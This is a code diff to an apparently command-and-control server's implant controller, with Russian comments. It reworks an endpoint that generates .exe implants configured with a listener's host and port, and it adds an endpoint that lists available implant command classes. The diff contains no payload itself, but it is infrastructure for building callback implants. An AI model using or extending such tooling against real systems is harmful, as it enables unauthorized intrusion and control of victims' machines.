@@ -29,54 +29,45 @@ namespace TeamServer.Controllers.Implants
             var implant = await _context.Implants.FindAsync(implantId);
             if(implant == null) { return BadRequest(); }
 
-            return Ok(implant);
+            return File(implant.FileData, "application/octet-stream", implant.FileName);
         }
 
         [HttpPost("generate/{listenerid}")]
-        public async Task<ActionResult> GenerateImplant(IFormFile file, string listenerid, string[] classNames)
+        public async Task<ActionResult> GenerateImplant(string listenerid, List<string> classNames)
         {
-            // Проверка входных данных
-            if (file == null || file.Length == 0)
-                return BadRequest("Invalid request");
-
             var listener = await _context.Listeners.FindAsync(listenerid);
             if (listener is null) return BadRequest("Invalid request");
 
             var listenerType = await _context.ListenerTypes.FindAsync(listener.ListenerTypeId);
             if (listenerType is null) return BadRequest("Invalid request");
 
-            try
+            // Вызов функции RemoveClasses и получение измененного файла в виде массива байтов
+            byte[] modifiedBytes = await Services.Implant.ImplantGenerator.GenerateImplant(
+                listener.BindHost, listener.BindPort.ToString(), listenerType.Name, classNames);
+
+            // Генерация уникального имени файла
+            string fileName = $"{Guid.NewGuid()}.exe";
+
+            await _context.Implants.AddAsync(new Models.Implant
             {
-                // Чтение загруженного файла в память
-                using (var memoryStream = new MemoryStream())
-                {
-                    file.CopyTo(memoryStream);
+                ListenerId = listenerid,
+                FileData = modifiedBytes,
+                FileName = fileName
+            });
 
-                    // Вызов функции RemoveClasses и получение измененного файла в виде массива байтов
-                    byte[] modifiedBytes = Services.Implant.ImplantGenerator.GenerateImplant(memoryStream.ToArray(),
-                        listener.BindHost, listener.BindPort.ToString(), listenerType.Name, classNames);
+            _context.SaveChanges();
 
-                    // Генерация уникального имени файла
-                    string fileName = $"{Guid.NewGuid()}.exe";
-
-                    await _context.Implants.AddAsync(new Models.Implant
-                    {
-                        ListenerId = listenerid,
-                        FileData = modifiedBytes,
-                        FileName = fileName
-                    });
-
-                    _context.SaveChanges();
-
-                    // Возвращение измененного исполняемого файла клиенту
-                    return File(modifiedBytes, "application/octet-stream", fileName);
-                }
-            }
-            catch (Exception ex)
-            {
-                return StatusCode(500, $"Error: {ex.Message}");
-            }
+            // Возвращение измененного исполняемого файла клиенту
+            return File(modifiedBytes, "application/octet-stream", fileName);
+           
         }
+
+        [HttpGet("/api/implants/commands")]
+        public async Task<ActionResult<List<string>>> GetAllCommands()
+        {
+            return Ok(await Services.Implant.ImplantGenerator.GetlAllCommandClasses());
+        }
+
 
         [HttpDelete("{id}")]
         public async Task<ActionResult<List<Implant>>> RemoveImplant(string id)
